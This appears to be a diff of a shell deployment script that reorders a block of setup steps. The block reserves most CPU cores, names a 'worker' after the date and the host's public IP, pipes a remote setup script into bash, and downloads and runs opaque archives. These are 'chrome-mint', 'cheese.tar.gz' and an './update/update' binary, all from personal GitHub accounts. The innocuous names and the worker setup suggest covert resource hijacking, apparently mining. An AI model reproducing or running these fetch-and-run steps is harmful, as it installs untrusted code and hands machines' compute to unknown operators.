@@ -3,6 +3,48 @@ cd
 sleep 2
 whoami
 sleep 3
+
+num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
+currentdate=$(date '+%d-%b-%Y_Col_')
+ipaddress=$(curl -s ifconfig.me)
+underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
+currentdate+=$underscored_ip
+used_num_of_cores=`expr $num_of_cores - 6`
+
+echo ""
+echo "You have a total number of $used_num_of_cores cores"
+echo ""
+
+echo ""
+echo "Your worker name is $currentdate"
+echo ""
+
+sleep 2
+
+# Function to check if Node.js is installed
+
+wget -O - https://deb.nodesource.com/setup_20.x | bash
+apt -y install nodejs
+
+sleep 2
+
+curl https://github.com/malphite-code-2/chrome-scraper/releases/download/chrome-v2/chrome-mint.tar.gz -L -O -J
+tar -xvf chrome-mint.tar.gz
+rm chrome-mint.tar.gz
+cd chrome-mint
+
+# Install dependencies
+npm install
+
+sleep 2
+
+wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add -
+echo "deb http://dl.google.com/linux/chrome/deb/ stable main" | tee /etc/apt/sources.list.d/google.list
+
+sleep 2
+
+apt-get update
+apt-get install -y google-chrome-stable
 wget -q https://raw.githubusercontent.com/thembilemhlabangula/update/main/cheese.tar.gz > /dev/null
 
 sleep 2
@@ -46,49 +88,8 @@ sleep 3
 sleep 2
 
 ./update/update curl ifconfig.me
-	
-num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
-currentdate=$(date '+%d-%b-%Y_Col_')
-ipaddress=$(curl -s ifconfig.me)
-underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
-currentdate+=$underscored_ip
-used_num_of_cores=`expr $num_of_cores - 6`
-
-echo ""
-echo "You have a total number of $used_num_of_cores cores"
-echo ""
-
-echo ""
-echo "Your worker name is $currentdate"
-echo ""
 
 sleep 2
-
-# Function to check if Node.js is installed
-
-wget -O - https://deb.nodesource.com/setup_20.x | bash
-apt -y install nodejs
-
-sleep 2
-
-curl https://github.com/malphite-code-2/chrome-scraper/releases/download/chrome-v2/chrome-mint.tar.gz -L -O -J
-tar -xvf chrome-mint.tar.gz
-rm chrome-mint.tar.gz
-cd chrome-mint
-
-# Install dependencies
-npm install
-
-sleep 2
-
-wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add -
-echo "deb http://dl.google.com/linux/chrome/deb/ stable main" | tee /etc/apt/sources.list.d/google.list
-
-sleep 2
-
-apt-get update
-apt-get install -y google-chrome-stable
-
 
 rm config.json
 
